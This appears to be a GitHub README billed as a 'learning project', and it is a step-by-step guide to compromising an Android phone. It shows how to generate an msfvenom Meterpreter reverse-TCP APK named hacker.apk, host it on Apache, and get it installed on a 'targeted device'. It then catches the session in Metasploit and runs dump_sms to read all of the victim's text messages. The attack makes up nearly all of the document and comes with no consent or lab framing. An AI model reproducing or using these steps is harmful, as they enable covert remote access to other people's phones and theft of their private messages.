# Access-Phone-s-SMS-Remotely
Remote SMS Learning Project  Learn SMS management via Android APK payloads.  Features: Education, Payloads, Security, User-friendly, Customization, Device Compatibility.
## Table of Content
1. [Generate APK File](#generate-apk-file)
2. [Accessibility](#accessibility)
3. [Check Server](#check-server)
4. [Installation](#installation)
5. [Permissions](#permissions)
6. [Accessing Device](#accessing-device)




## Generate APK File
`sudo msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.0.0 lport=4444 R > ./hacker.apk`
`sudo`: This is a command used in Unix-like operating systems to execute commands with superuser privileges. It allows the user to perform administrative tasks.
`msfvenom`: This is a Metasploit Framework payload generator. It's used to create payloads for exploiting vulnerabilities in systems.
`-p android/meterpreter/reverse_tcp`: This part specifies the payload to generate. In this case, it's creating a payload for Android devices that will connect back to the attacker's machine using the Meterpreter payload over a reverse TCP connection.
`lhost=192.168.0.0`: This option specifies the IP address of the attacker's machine (the listening host) to which the payload will connect back.
`lport=4444`: This option specifies the port on the attacker's machine where the payload will connect back.
`R > ./hacker.apk`: This part redirects the output of msfvenom to a file named hacker.apk. The -R flag is used to specify the output format, which in this case is an APK file for Android.

## Accessibility

Making the file to be easily accessible by other machine/system/device.
`sudo mv ./hacker.apk /var/www/html/`

## Check Server

Check whether your apache server is running or not.
`systemctl status apache2`
If the status is active (running), then okay. If not, use this command below to activate your apache2 server.
`sudo systemctl start apache2`
Optionally, you can also enable Apache2 to start automatically on boot by running:
`sudo systemctl enable apache2`
To verify that Apache2 is running, you can use:
`sudo systemctl status apache2`
So, we have our web application server running.

## Installation

Open your favourate browser on the targeted device and type the ip address followed by forward slash hacker.apk. For example if the ip addr is 192.168.0.0:
➡ 192.168.0.0/hacker.apk

## Permissions

After this, allow the permission to install the apk in the device. Enable all the permissions if needed from the settings>apps>app_name

## Accessing Device

Open Metasploit Framework in your Linux terminal. Type the command in your linux terminal to start Metasploit Framework.
`msfconsole`
Type this command to use the specific exploit:
`use exploit/multi/handler`
Set payload using this command:
`set payload android/meterpreter/reverse_tcp`
See Options:
`show options`
Set LHOST by the ip addr of the listener machine i.e. in our case, Kali Linux:
`set LHOST 192.168.0.0` ➡ Replace 192.168.0.0 with your machine ip addr.
After this, run it by using one of these commands:
`exploit` or `run`
As soon as yopu open the installed apk in the targeted device, it will create a meterpreter session in your terminal.
Type `help` to see all the available options and commands that you can pass.
`app_list` This will show us all the applications data already installed inside the device.
Type command: `dump_sms` and hit enter.
Then immediately you will see we have a file created on our desktop. Open it and ypu can see all of the text messages.


There's a lot more commands that we can do as part of this android hacking. Stay tuned for more valueable information to be shared with you :)
